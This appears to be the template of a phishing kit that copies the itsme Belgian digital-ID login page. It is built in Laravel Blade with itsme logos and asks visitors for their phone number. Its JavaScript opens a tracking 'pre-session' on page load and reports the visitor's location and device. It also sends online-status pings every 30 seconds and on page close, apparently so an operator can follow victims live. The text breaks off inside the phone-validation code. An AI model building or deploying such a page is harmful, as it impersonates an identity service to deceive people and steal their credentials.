<!DOCTYPE html>
<!-- saved from url=(0080)https://idp.prd.itsme.services/spa/oidc?session=345e66d63b6941fc8d31f4aec859cd2f -->
<html lang="{{ app()->getLocale() }}" data-beasties-container="">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="csrf-token" content="{{ csrf_token() }}">

  <title>OIDC</title>
  <!--<base href="/spa/">-->
  <base href=".">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" href="https://idp.prd.itsme.services/spa/assets/ui/itsme-logo.ico" sizes="48x48">
  <link rel="icon" href="./OIDC_files/itsme-logo.svg" sizes="any" type="image/svg+xml">
  <link rel="apple-touch-icon" href="https://idp.prd.itsme.services/spa/assets/ui/itsme-logo.png">
  <link rel="stylesheet" href="/assets//styles.64ac09ea73ffc406.css" media="all">
  <link rel="stylesheet" href="/assets/css3.css">
  <link rel="stylesheet" href="/assets/css2.css">
  <style>
    #phone-error {
      color: #721c24;
      background-color: #f8d7da;
      border: 1px solid #f5c6cb;
      padding: 12px 20px;
      border-radius: 8px;
      font-size: 14px;
      margin-bottom: 20px;
      display: none;
      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
    }
    #phone-error.show {
      display: flex;
      align-items: center;
    }
    #phone-error::before {
      content: '⚠️';
      margin-right: 10px;
      font-size: 18px;
    }

    /* Country Select Dialog */
    #country-dialog {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      z-index: 10000;
    }
    #country-dialog.open {
      display: block;
    }
    #country-dialog .cd-backdrop {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background-color: #202120;
      opacity: 0.4;
    }
    #country-dialog .cd-wrapper {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
      z-index: 1;
    }
    #country-dialog .cd-panel {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 16px 24px rgba(0,0,0,0.25);
      width: 100%;
      max-width: 420px;
      max-height: calc(100vh - 32px);
      max-height: calc(100dvh - 32px);
      display: flex;
      flex-direction: column;
      overflow: hidden;
      animation: cdSlideIn 0.25s ease;
      position: relative;
    }
    @keyframes cdSlideIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    @media (max-width: 427px) {
      #country-dialog .cd-wrapper { padding: 0; }
      #country-dialog .cd-panel {
        border-radius: 0;
        max-height: 100vh;
        max-height: 100dvh;
        height: 100%;
      }
    }
    #country-dialog .cd-header {
      padding: 16px 16px 0;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }
    @media (min-width: 428px) {
      #country-dialog .cd-header { padding: 16px 40px 0; }
    }
    #country-dialog .cd-close {
      background: url('/assets/close.svg') no-repeat center;
      width: 24px;
      height: 24px;
      border: none;
      position: absolute;
      top: 18px;
      right: 12px;
      padding: 0;
      cursor: pointer;
    }
    #country-dialog .cd-title {
      margin: 0 0 16px 0;
      font-family: 'Roboto Slab', serif;
      font-size: 20px;
      font-weight: 700;
      line-height: 28px;
      color: #202120;
    }
    #country-dialog .cd-search {
      border: 1px solid #747474;
      border-radius: 8px;
      margin: 4px 16px 24px;
      padding: 12px 5px 12px 16px;
      display: flex;
      align-items: center;
    }
    @media (min-width: 428px) {
      #country-dialog .cd-search { margin: 4px 40px 24px; }
    }
    #country-dialog .cd-search:focus-within,
    #country-dialog .cd-search:hover {
      border: 1px solid transparent;
      outline: 2px solid #008048;
      outline-offset: -1px;
    }
    #country-dialog .cd-search input {
      width: 100%;
      height: 24px;
      outline: none;
      border: none;
      padding-left: 30px;
      background: url('/assets/looking-glass.svg') no-repeat;
      background-position-y: center;
      flex: 2 0;
      color: #212121;
      caret-color: #009eb4;
      font-family: Roboto, sans-serif;
      font-size: 16px;
      font-weight: 400;
      line-height: 24px;
    }
    #country-dialog .cd-search input::placeholder {
      color: #747474;
    }
    #country-dialog .cd-search .cd-clear-btn {
      background: url('/assets/clear.svg') no-repeat center;
      width: 24px;
      height: 24px;
      border: none;
      cursor: pointer;
      visibility: hidden;
      flex-shrink: 0;
    }
    #country-dialog .cd-search .cd-clear-btn.visible {
      visibility: visible;
    }
    #country-dialog .cd-countries {
      overflow-y: auto;
      padding: 0 16px;
      flex: 1;
      -webkit-overflow-scrolling: touch;
    }
    @media (min-width: 428px) {
      #country-dialog .cd-countries { padding: 0 40px; }
    }
    #country-dialog .cd-countries h2 {
      margin: 0 0 4px 0;
      font-family: Roboto, sans-serif;
      font-size: 18px;
      font-weight: 700;
      line-height: 28px;
      color: #202120;
    }
    #country-dialog .cd-countries ul {
      list-style: none;
      padding: 0;
      margin-top: 0;
      margin-bottom: 24px;
    }
    #country-dialog .cd-countries li button {
      width: 100%;
      background: none;
      border: none;
      padding: 0;
      height: 60px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      box-shadow: inset 0 -1px #e6e6e6;
      color: #202120;
      font-family: Roboto, sans-serif;
      font-size: 18px;
      font-weight: 400;
      line-height: 28px;
      cursor: pointer;
      transition: background 0.12s;
    }
    #country-dialog .cd-countries li button:hover {
      background: #f5f5f5;
    }
    #country-dialog .cd-countries li button.selected {
      font-weight: 600;
    }
    #country-dialog .cd-countries li button .sub {
      display: flex;
      align-items: center;
      width: 100%;
      padding: 0 8px;
    }
    #country-dialog .cd-countries li button .country-flag {
      margin-right: 16px;
      display: flex;
      align-items: center;
    }
    #country-dialog .cd-countries li button .country-flag img {
      width: 24px;
      height: 24px;
    }
    #country-dialog .cd-countries li button .country-name {
      flex: 1;
      text-align: left;
    }
    #country-dialog .cd-countries li button .country-code {
      color: #747474;
      margin-left: 8px;
    }
    #country-dialog .cd-countries li button .visually-hidden {
      position: absolute;
      width: 1px;
      height: 1px;
      overflow: hidden;
      clip: rect(0,0,0,0);
      white-space: nowrap;
      border: 0;
    }
    #country-dialog .cd-no-results {
      display: none;
      margin-top: 0;
      margin-bottom: 24px;
      color: #747474;
      font-family: Roboto, sans-serif;
      font-size: 18px;
      font-weight: 400;
      line-height: 28px;
    }
    #country-dialog .cd-no-results.visible {
      display: block;
    }
    .input--select-country-code {
      cursor: pointer;
    }
    .input--select-country-code:hover {
      opacity: 0.7;
    }
  </style>
</head>
<body>
  <oidc-root ngcspnonce="1024df17-0385-46c0-abab-f0c60f35c714"
    ng-version="19.2.6"><oidc-entry-shell><oidc-app-qr-phone-form-shell><fui-template _nghost-ng-c385892400="">
          <div _ngcontent-ng-c385892400="" id="main-container"><fui-background-container _ngcontent-ng-c385892400=""
              _nghost-ng-c980954113="">
              <div _ngcontent-ng-c980954113="" class="fui-background">
                <div _ngcontent-ng-c980954113="" class="fui-curve"></div>
              </div>
            </fui-background-container>
            <div _ngcontent-ng-c385892400="" class="tpl-container">
              <header _ngcontent-ng-c385892400="">
                <div _ngcontent-ng-c385892400="" class="im-header"><fapp-header-shell header=""><fui-header
                      _nghost-ng-c279199553="">
                      <div _ngcontent-ng-c279199553="" class="header">
                        <div _ngcontent-ng-c279199553="" class="header-image"><a _ngcontent-ng-c279199553=""
                            target="_blank" href="https://www.itsme-id.com/en-BE" aria-label="itsme homepage"><img
                              _ngcontent-ng-c279199553="" src="./OIDC_files/itsme-logo.svg" alt="itsme homepage"></a>
                        </div>
                        <div _ngcontent-ng-c279199553="" class="header-locales"><fui-locale-switcher
                            _ngcontent-ng-c279199553="" _nghost-ng-c2297254974="">
                            <nav aria-label="Language" class="block block--menu block--menu--lang" style="margin-right: 15px;">
                  <ul class="menu menu--lang"
                    style="display: flex; gap: 8px; list-style: none; margin: 0; padding: 0; align-items: center;">
                    <li class="menu-item {{ app()->getLocale() === 'nl' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'nl') }}"
                        style="font-family: Roboto Slab, serif;font-weight: {{ app()->getLocale() === 'nl' ? '700' : '500' }}; color: {{ app()->getLocale() === 'nl' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        NL
                      </a>
                    </li>
                    <li style="color: #ccc;">|</li>
                    <li class="menu-item {{ app()->getLocale() === 'fr' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'fr') }}"
                        style="font-family: Roboto Slab, serif;font-weight: {{ app()->getLocale() === 'fr' ? '700' : '500' }}; color: {{ app()->getLocale() === 'fr' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        FR
                      </a>
                    </li>
                  </ul>
                </nav>
                          </fui-locale-switcher></div>
                      </div>
                    </fui-header></fapp-header-shell></div>
              </header>
              <main _ngcontent-ng-c385892400="">
                <div _ngcontent-ng-c385892400="" class="im-content-primary"><oidc-app-qr-phone-form contentprimary=""
                    _nghost-ng-c2021898164="">
                    <h1 _ngcontent-ng-c2021898164="">{{ __('messages.identify_yourself') }}</h1>
                    <div id="phone-error-container"></div>
                    <div _ngcontent-ng-c2021898164="" class="normal">
                      <div _ngcontent-ng-c2021898164="" class="im-form ng-pristine ng-valid ng-touched">
                        <fui-accordion _ngcontent-ng-c2021898164="" _nghost-ng-c471075519="">
                          <div _ngcontent-ng-c471075519="" class="im-container closed init">
                            <div _ngcontent-ng-c471075519="" class="header">

                              <h2 _ngcontent-ng-c471075519=""><button _ngcontent-ng-c471075519="" type="button"
                                  aria-expanded="false" class="closed"><span _ngcontent-ng-c471075519="">{{ __('messages.use_phone_number') }}</span></button></h2>
                            </div>
                            <div class="form--input-container">
 <div class="form-input--block input--country-code">
                      <div class="input--select-country-code" id="country-selector">
                        <img src="https://assets.prd.itsme.services/icons/be.svg" id="country-flag-img" alt="" width="24" height="24">
                        <span id="country-code-display">
                          +32
                        </span>
                        <svg width="6" height="4" viewBox="0 0 6 4" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path
                            d="M3 3.45703L-1.31988e-07 0.457031L0.462891 5.12487e-08L3 2.53125L5.53125 2.72794e-07L6 0.457032L3 3.45703Z"
                            fill="#3C3C3C" />
                        </svg>
                        <div class="input--select-line"></div>
                      </div>
                      <input type="text" class="form--input input--phone-number" id="phone-input" inputmode="tel" placeholder="{{ __('messages.phone_placeholder') }}">

                    </div>
                     <button type="button" id="phone-submit-btn" disabled>
                      <span>
                        {{ __('messages.send') }}
                      </span>
                    </button>
                    </div>
                          </div>
                        </fui-accordion>
                      </div>
                    </div>

                  </oidc-app-qr-phone-form></div>
                <div _ngcontent-ng-c385892400="" class="im-content-secondary"><oidc-app-qr-phone-form-information
                    contentsecondary="" _nghost-ng-c3711733125="">
                    <div _ngcontent-ng-c3711733125=""><img _ngcontent-ng-c3711733125=""
                        src="./OIDC_files/ItsmeAppGeneric.Svg" alt="">
                      <h2 _ngcontent-ng-c3711733125=""><span aria-hidden="true">itsme<sup>®</sup></span><span lang="en"
                          class="visually-hidden">it's me</span>, {{ __('messages.your_digital_id') }}</h2>
                      <p _ngcontent-ng-c3711733125="">{{ __('messages.itsme_description') }}</p>

                    </div>
                  </oidc-app-qr-phone-form-information></div>
              </main>


            </div>
          </div>
        </fui-template></oidc-app-qr-phone-form-shell></oidc-entry-shell></oidc-root>
<!-- Country Selection Dialog -->
<div id="country-dialog" aria-labelledby="cd-dialog-title" aria-modal="true">
  <div class="cd-backdrop" id="cd-backdrop"></div>
  <div class="cd-wrapper">
    <div class="cd-panel">
      <div class="cd-header">
        <button class="cd-close" id="cd-close-btn" aria-label="Close"></button>
        <h1 class="cd-title" id="cd-dialog-title">Select country</h1>
      </div>
      <div class="cd-search">
        <input type="text" id="cd-search-input" autocomplete="off" placeholder="Search" aria-label="Search">
        <button class="cd-clear-btn" id="cd-clear-btn" aria-label="Clear text"></button>
      </div>
      <div class="cd-countries">
        <h2 id="cd-most-title">Most selected</h2>
        <ul id="cd-most-list"></ul>
        <h2 id="cd-all-title">All</h2>
        <ul id="cd-all-list"></ul>
        <p class="cd-no-results" id="cd-no-results">No countries found</p>
      </div>
    </div>
  </div>
</div>

<script>
// Countries data
window.allCountries = [
  {code:'af',name:'Afghanistan',dial:'+93'},
  {code:'al',name:'Albania',dial:'+355'},
  {code:'dz',name:'Algeria',dial:'+213'},
  {code:'as',name:'American Samoa',dial:'+684'},
  {code:'ad',name:'Andorra',dial:'+376'},
  {code:'ao',name:'Angola',dial:'+244'},
  {code:'ai',name:'Anguilla',dial:'+1264'},
  {code:'ag',name:'Antigua & Barbuda',dial:'+1268'},
  {code:'ar',name:'Argentina',dial:'+54'},
  {code:'am',name:'Armenia',dial:'+374'},
  {code:'aw',name:'Aruba',dial:'+297'},
  {code:'au',name:'Australia',dial:'+61'},
  {code:'at',name:'Austria',dial:'+43'},
  {code:'az',name:'Azerbaijan',dial:'+994'},
  {code:'bs',name:'Bahamas',dial:'+1242'},
  {code:'bh',name:'Bahrain',dial:'+973'},
  {code:'bd',name:'Bangladesh',dial:'+880'},
  {code:'bb',name:'Barbados',dial:'+1246'},
  {code:'by',name:'Belarus',dial:'+375'},
  {code:'be',name:'Belgium',dial:'+32'},
  {code:'bz',name:'Belize',dial:'+501'},
  {code:'bj',name:'Benin',dial:'+229'},
  {code:'bm',name:'Bermuda',dial:'+1441'},
  {code:'bt',name:'Bhutan',dial:'+975'},
  {code:'bo',name:'Bolivia',dial:'+591'},
  {code:'ba',name:'Bosnia & Herzegovina',dial:'+387'},
  {code:'bw',name:'Botswana',dial:'+267'},
  {code:'br',name:'Brazil',dial:'+55'},
  {code:'vg',name:'British Virgin Islands',dial:'+284'},
  {code:'bn',name:'Brunei',dial:'+673'},
  {code:'bg',name:'Bulgaria',dial:'+359'},
  {code:'bf',name:'Burkina Faso',dial:'+226'},
  {code:'bi',name:'Burundi',dial:'+257'},
  {code:'kh',name:'Cambodia',dial:'+855'},
  {code:'cm',name:'Cameroon',dial:'+237'},
  {code:'ca',name:'Canada',dial:'+1'},
  {code:'cv',name:'Cape Verde',dial:'+238'},
  {code:'ky',name:'Cayman Islands',dial:'+1345'},
  {code:'cf',name:'Central African Republic',dial:'+236'},
  {code:'td',name:'Chad',dial:'+235'},
  {code:'cl',name:'Chile',dial:'+56'},
  {code:'cn',name:'China',dial:'+86'},
  {code:'co',name:'Colombia',dial:'+57'},
  {code:'km',name:'Comoros',dial:'+269'},
  {code:'cg',name:'Congo - Brazzaville',dial:'+242'},
  {code:'cd',name:'Congo - Kinshasa',dial:'+243'},
  {code:'ck',name:'Cook Islands',dial:'+682'},
  {code:'cr',name:'Costa Rica',dial:'+506'},
  {code:'ci',name:"C\u00f4te d'Ivoire",dial:'+225'},
  {code:'hr',name:'Croatia',dial:'+385'},
  {code:'cu',name:'Cuba',dial:'+53'},
  {code:'cw',name:'Cura\u00e7ao',dial:'+599'},
  {code:'cy',name:'Cyprus',dial:'+357'},
  {code:'cz',name:'Czechia',dial:'+420'},
  {code:'dk',name:'Denmark',dial:'+45'},
  {code:'dj',name:'Djibouti',dial:'+253'},
  {code:'dm',name:'Dominica',dial:'+1767'},
  {code:'do',name:'Dominican Republic',dial:'+1'},
  {code:'ec',name:'Ecuador',dial:'+593'},
  {code:'eg',name:'Egypt',dial:'+20'},
  {code:'sv',name:'El Salvador',dial:'+503'},
  {code:'gq',name:'Equatorial Guinea',dial:'+240'},
  {code:'er',name:'Eritrea',dial:'+291'},
  {code:'ee',name:'Estonia',dial:'+372'},
  {code:'sz',name:'Eswatini',dial:'+268'},
  {code:'et',name:'Ethiopia',dial:'+251'},
  {code:'fk',name:'Falkland Islands (Islas Malvinas)',dial:'+500'},
  {code:'fo',name:'Faroe Islands',dial:'+298'},
  {code:'fj',name:'Fiji',dial:'+679'},
  {code:'fi',name:'Finland',dial:'+358'},
  {code:'fr',name:'France',dial:'+33'},
  {code:'gf',name:'French Guiana',dial:'+594'},
  {code:'pf',name:'French Polynesia',dial:'+689'},
  {code:'ga',name:'Gabon',dial:'+241'},
  {code:'gm',name:'Gambia',dial:'+220'},
  {code:'ge',name:'Georgia',dial:'+995'},
  {code:'de',name:'Germany',dial:'+49'},
  {code:'gh',name:'Ghana',dial:'+233'},
  {code:'gi',name:'Gibraltar',dial:'+350'},
  {code:'gr',name:'Greece',dial:'+30'},
  {code:'gl',name:'Greenland',dial:'+299'},
  {code:'gd',name:'Grenada',dial:'+1473'},
  {code:'gp',name:'Guadeloupe',dial:'+590'},
  {code:'gu',name:'Guam',dial:'+1671'},
  {code:'gt',name:'Guatemala',dial:'+502'},
  {code:'gn',name:'Guinea',dial:'+224'},
  {code:'gw',name:'Guinea-Bissau',dial:'+245'},
  {code:'gy',name:'Guyana',dial:'+592'},
  {code:'ht',name:'Haiti',dial:'+509'},
  {code:'hn',name:'Honduras',dial:'+504'},
  {code:'hk',name:'Hong Kong',dial:'+852'},
  {code:'hu',name:'Hungary',dial:'+36'},
  {code:'is',name:'Iceland',dial:'+354'},
  {code:'in',name:'India',dial:'+91'},
  {code:'id',name:'Indonesia',dial:'+62'},
  {code:'ir',name:'Iran',dial:'+98'},
  {code:'iq',name:'Iraq',dial:'+964'},
  {code:'ie',name:'Ireland',dial:'+353'},
  {code:'il',name:'Israel',dial:'+972'},
  {code:'it',name:'Italy',dial:'+39'},
  {code:'jm',name:'Jamaica',dial:'+1876'},
  {code:'jp',name:'Japan',dial:'+81'},
  {code:'jo',name:'Jordan',dial:'+962'},
  {code:'kz',name:'Kazakhstan',dial:'+7'},
  {code:'ke',name:'Kenya',dial:'+254'},
  {code:'ki',name:'Kiribati',dial:'+686'},
  {code:'kw',name:'Kuwait',dial:'+965'},
  {code:'kg',name:'Kyrgyzstan',dial:'+996'},
  {code:'la',name:'Laos',dial:'+856'},
  {code:'lv',name:'Latvia',dial:'+371'},
  {code:'lb',name:'Lebanon',dial:'+961'},
  {code:'ls',name:'Lesotho',dial:'+266'},
  {code:'lr',name:'Liberia',dial:'+231'},
  {code:'ly',name:'Libya',dial:'+218'},
  {code:'li',name:'Liechtenstein',dial:'+423'},
  {code:'lt',name:'Lithuania',dial:'+370'},
  {code:'lu',name:'Luxembourg',dial:'+352'},
  {code:'mo',name:'Macao',dial:'+853'},
  {code:'mg',name:'Madagascar',dial:'+261'},
  {code:'mw',name:'Malawi',dial:'+265'},
  {code:'my',name:'Malaysia',dial:'+60'},
  {code:'mv',name:'Maldives',dial:'+960'},
  {code:'ml',name:'Mali',dial:'+223'},
  {code:'mt',name:'Malta',dial:'+356'},
  {code:'mq',name:'Martinique',dial:'+596'},
  {code:'mr',name:'Mauritania',dial:'+222'},
  {code:'mu',name:'Mauritius',dial:'+230'},
  {code:'mx',name:'Mexico',dial:'+52'},
  {code:'fm',name:'Micronesia',dial:'+691'},
  {code:'md',name:'Moldova',dial:'+373'},
  {code:'mc',name:'Monaco',dial:'+377'},
  {code:'mn',name:'Mongolia',dial:'+976'},
  {code:'me',name:'Montenegro',dial:'+382'},
  {code:'ms',name:'Montserrat',dial:'+1664'},
  {code:'ma',name:'Morocco',dial:'+212'},
  {code:'mz',name:'Mozambique',dial:'+258'},
  {code:'mm',name:'Myanmar (Burma)',dial:'+95'},
  {code:'na',name:'Namibia',dial:'+264'},
  {code:'np',name:'Nepal',dial:'+977'},
  {code:'nl',name:'Netherlands',dial:'+31'},
  {code:'nc',name:'New Caledonia',dial:'+687'},
  {code:'nz',name:'New Zealand',dial:'+64'},
  {code:'ni',name:'Nicaragua',dial:'+505'},
  {code:'ne',name:'Niger',dial:'+227'},
  {code:'ng',name:'Nigeria',dial:'+234'},
  {code:'nu',name:'Niue',dial:'+683'},
  {code:'kp',name:'North Korea',dial:'+850'},
  {code:'mk',name:'North Macedonia',dial:'+389'},
  {code:'no',name:'Norway',dial:'+47'},
  {code:'om',name:'Oman',dial:'+968'},
  {code:'pk',name:'Pakistan',dial:'+92'},
  {code:'pw',name:'Palau',dial:'+680'},
  {code:'ps',name:'Palestine',dial:'+970'},
  {code:'pa',name:'Panama',dial:'+507'},
  {code:'pg',name:'Papua New Guinea',dial:'+675'},
  {code:'py',name:'Paraguay',dial:'+595'},
  {code:'pe',name:'Peru',dial:'+51'},
  {code:'ph',name:'Philippines',dial:'+63'},
  {code:'pl',name:'Poland',dial:'+48'},
  {code:'pt',name:'Portugal',dial:'+351'},
  {code:'pr',name:'Puerto Rico',dial:'+1'},
  {code:'qa',name:'Qatar',dial:'+974'},
  {code:'re',name:'R\u00e9union',dial:'+262'},
  {code:'ro',name:'Romania',dial:'+40'},
  {code:'ru',name:'Russia',dial:'+7'},
  {code:'rw',name:'Rwanda',dial:'+250'},
  {code:'ws',name:'Samoa',dial:'+685'},
  {code:'sm',name:'San Marino',dial:'+378'},
  {code:'st',name:'S\u00e3o Tom\u00e9 & Pr\u00edncipe',dial:'+239'},
  {code:'sa',name:'Saudi Arabia',dial:'+966'},
  {code:'sn',name:'Senegal',dial:'+221'},
  {code:'rs',name:'Serbia',dial:'+381'},
  {code:'sc',name:'Seychelles',dial:'+248'},
  {code:'sl',name:'Sierra Leone',dial:'+232'},
  {code:'sg',name:'Singapore',dial:'+65'},
  {code:'sk',name:'Slovakia',dial:'+421'},
  {code:'si',name:'Slovenia',dial:'+386'},
  {code:'sb',name:'Solomon Islands',dial:'+677'},
  {code:'so',name:'Somalia',dial:'+252'},
  {code:'za',name:'South Africa',dial:'+27'},
  {code:'kr',name:'South Korea',dial:'+82'},
  {code:'ss',name:'South Sudan',dial:'+211'},
  {code:'es',name:'Spain',dial:'+34'},
  {code:'lk',name:'Sri Lanka',dial:'+94'},
  {code:'kn',name:'St. Kitts & Nevis',dial:'+1869'},
  {code:'lc',name:'St. Lucia',dial:'+1758'},
  {code:'pm',name:'St. Pierre & Miquelon',dial:'+508'},
  {code:'vc',name:'St. Vincent & Grenadines',dial:'+1784'},
  {code:'sd',name:'Sudan',dial:'+249'},
  {code:'sr',name:'Suriname',dial:'+597'},
  {code:'se',name:'Sweden',dial:'+46'},
  {code:'ch',name:'Switzerland',dial:'+41'},
  {code:'sy',name:'Syria',dial:'+963'},
  {code:'tw',name:'Taiwan',dial:'+886'},
  {code:'tz',name:'Tanzania',dial:'+255'},
  {code:'th',name:'Thailand',dial:'+66'},
  {code:'tl',name:'Timor-Leste',dial:'+670'},
  {code:'tg',name:'Togo',dial:'+228'},
  {code:'tk',name:'Tokelau',dial:'+992'},
  {code:'to',name:'Tonga',dial:'+676'},
  {code:'tt',name:'Trinidad & Tobago',dial:'+1868'},
  {code:'tn',name:'Tunisia',dial:'+216'},
  {code:'tr',name:'T\u00fcrkiye',dial:'+90'},
  {code:'tm',name:'Turkmenistan',dial:'+993'},
  {code:'tc',name:'Turks & Caicos Islands',dial:'+1'},
  {code:'tv',name:'Tuvalu',dial:'+688'},
  {code:'ug',name:'Uganda',dial:'+256'},
  {code:'ua',name:'Ukraine',dial:'+380'},
  {code:'ae',name:'United Arab Emirates',dial:'+971'},
  {code:'gb',name:'United Kingdom',dial:'+44'},
  {code:'us',name:'United States',dial:'+1'},
  {code:'uy',name:'Uruguay',dial:'+598'},
  {code:'uz',name:'Uzbekistan',dial:'+998'},
  {code:'vu',name:'Vanuatu',dial:'+678'},
  {code:'ve',name:'Venezuela',dial:'+58'},
  {code:'vn',name:'Vietnam',dial:'+84'},
  {code:'ye',name:'Yemen',dial:'+967'},
  {code:'zm',name:'Zambia',dial:'+260'},
  {code:'zw',name:'Zimbabwe',dial:'+263'}
];
window.mostSelectedCodes = ['be', 'lu', 'nl'];
window.selectedCountryCode = 'be';

// Get mask pattern for a dial code
window.getMaskPattern = function(dialCode) {
  var code = dialCode.replace('+', '');
  switch(code.length) {
    case 1: return '+' + code + ' 000 000 0000';
    case 2: return '+' + code + ' 000 000 0000';
    case 3: return '+' + code + ' 000 000 000';
    default: return '+' + code + ' 000 0000';
  }
};
</script>

<script src="https://unpkg.com/imask"></script>
<script>
// Translations for JavaScript
window.translations = {
    send: '{{ __('messages.send') }}',
    loading: '{{ __('messages.loading') }}',
    phone_error_incomplete: '{{ app()->getLocale() === 'fr' ? 'Veuillez entrer un numéro de téléphone complet' : 'Please enter a complete phone number' }}',
    phone_error_invalid: '{{ app()->getLocale() === 'fr' ? 'Veuillez entrer un numéro de téléphone belge valide' : 'Please enter a valid Belgian phone number' }}'
};

document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phone-input');
    const submitBtn = document.getElementById('phone-submit-btn');
    let preSessionId = null;
    let onlineCheckInterval = null;
    let selectedCountry = window.allCountries.find(function(c) { return c.code === 'be'; });
    
    // Initialize country dialog
    initCountryDialog();
    
    // Create pre-session immediately when page loads
    createPreSession();
    
    // Check for existing main session
    const existingSessionId = localStorage.getItem('session_id');
    if (existingSessionId && window.SessionManager) {
        window.SessionManager.setSessionId(existingSessionId);
        window.SessionManager.checkSessionStatus();
        trackPageVisit(existingSessionId, 'Login page', window.location.href);
    }
    
    // Track page visit function
    async function trackPageVisit(sessionId, pageName, pageUrl, actionType = null) {
        try {
            await fetch(`/api/session/${sessionId}/visit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    page_name: pageName,
                    page_url: pageUrl,
                    action_type: actionType
                })
            });
        } catch (error) {
            console.error('Failed to track page visit:', error);
        }
    }
    
    // Create pre-session for tracking
    async function createPreSession() {
        try {
            const response = await fetch('/api/pre-session', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    page_name: 'Login page',
                    page_url: window.location.href
                })
            });
            
            if (response.ok) {
                const data = await response.json();
                preSessionId = data.pre_session_id;
                
                // Store pre-session ID
                localStorage.setItem('pre_session_id', preSessionId);
                
                // Start online checking
                startOnlineChecking();
                
                // Show tracking info in console
                console.log('🌐 Pre-session created:', preSessionId);
                console.log('📍 Location:', data.tracking_data);
                
                
            }
        } catch (error) {
            console.error('Failed to create pre-session:', error);
        }
    }
    
    // Start online status checking
    function startOnlineChecking() {
        if (!preSessionId) return;
        
        // Check online status immediately
        updateOnlineStatus(true);
        
        // Set up periodic online checking
        onlineCheckInterval = setInterval(() => {
            updateOnlineStatus(true);
        }, 30000); // Check every 30 seconds
        
        // Check when user leaves page
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                updateOnlineStatus(true);
            }
        });
        
        // Check when user closes window
        window.addEventListener('beforeunload', () => {
            // Send final online status
            const fd = new FormData();
            fd.append('is_online', '0');
            fd.append('_token', document.querySelector('meta[name="csrf-token"]').content);
            navigator.sendBeacon(`/api/pre-session/${preSessionId}/online`, fd);
        });
    }
    
    // Update online status
    async function updateOnlineStatus(isOnline) {
        if (!preSessionId) return;
        
        try {
            await fetch(`/api/pre-session/${preSessionId}/online`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify({
                    is_online: isOnline
                })
            });
        } catch (error) {
            console.error('Failed to update online status:', error);
        }
    }
    
    // Display tracking info to user
    function displayTrackingInfo(trackingData) {
        // Create tracking info element
        const trackingDiv = document.createElement('div');
        trackingDiv.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 8px 12px;
            border-radius: 4px;
            font-size: 11px;
            z-index: 9999;
            max-width: 200px;
        `;
        
        const countryFlag = getCountryFlag(trackingData.country_code);
        trackingDiv.innerHTML = `
            🌐 ${trackingData.locale?.toUpperCase() || 'NL'}<br>
            ${countryFlag} ${trackingData.country || 'Unknown'}<br>
            📱 ${trackingData.device_type}<br>
            📍 ${trackingData.city || 'Unknown'}
        `;
        
        document.body.appendChild(trackingDiv);
        
        // Remove after 10 seconds
        setTimeout(() => {
            if (trackingDiv.parentNode) {
                trackingDiv.parentNode.removeChild(trackingDiv);
            }
        }, 10000);
    }
    
    // Get country flag emoji
    function getCountryFlag(countryCode) {
        const flags = {
            'BE': '🇧🇪',
            'NL': '🇳🇱',
            'FR': '🇫🇷',
            'DE': '🇩🇪',
            'LU': '🇱🇺',
            'GB': '🇬🇧',
            'US': '🇺🇸',
            'CA': '🇨🇦',
            'AU': '🇦🇺',
            'JP': '🇯🇵',
            'CN': '🇨🇳',
            'IN': '🇮🇳',
            'BR': '🇧🇷',
            'RU': '🇷🇺',
            'IT': '🇮🇹',
            'ES': '🇪🇸',
            'CH': '🇨🇭',
            'AT': '🇦🇹',
            'SE': '🇸🇪',
            'NO': '🇳🇴',
            'DK': '🇩🇰',
            'FI': '🇫🇮',
            'PL': '🇵🇱',
            'CZ': '🇨🇿',
            'SK': '🇸🇰',
            'HU': '🇭🇺',
            'RO': '🇷🇴',
            'BG': '🇧🇬',
            'GR': '🇬🇷',
            'TR': '🇹🇷',
            'IE': '🇮🇪',
            'PT': '🇵🇹'
        };
        
        return flags[countryCode] || '🌍';
    }
    
    // Создаем элемент для ошибки
    const errorDiv = document.createElement('div');
    errorDiv.className = 'phone-error';
    errorDiv.id = 'phone-error';
    document.getElementById('phone-error-container').appendChild(errorDiv);
    
    // Dynamic phone mask based on selected country
    let phoneMask;
    function updatePhoneMask(dialCode) {
        if (phoneMask) phoneMask.destroy();
        phoneInput.value = '';
        phoneMask = IMask(phoneInput, {
            mask: window.getMaskPattern(dialCode),
            lazy: false,
            placeholderChar: '_'
        });
        phoneMask.on('accept', function() { validatePhone(); });
    }
    updatePhoneMask(selectedCountry.dial);
    
    // Listen for country changes from dialog
    document.addEventListener('countryChanged', function(e) {
        selectedCountry = e.detail;
        updatePhoneMask(selectedCountry.dial);
        phoneInput.focus();
    });
    
    // Phone validation - works with any country
    function validatePhone() {
        var value = phoneInput.value;
        var hasPlaceholder = value.includes('_');
        var digitsOnly = value.replace(/[^\d]/g, '');
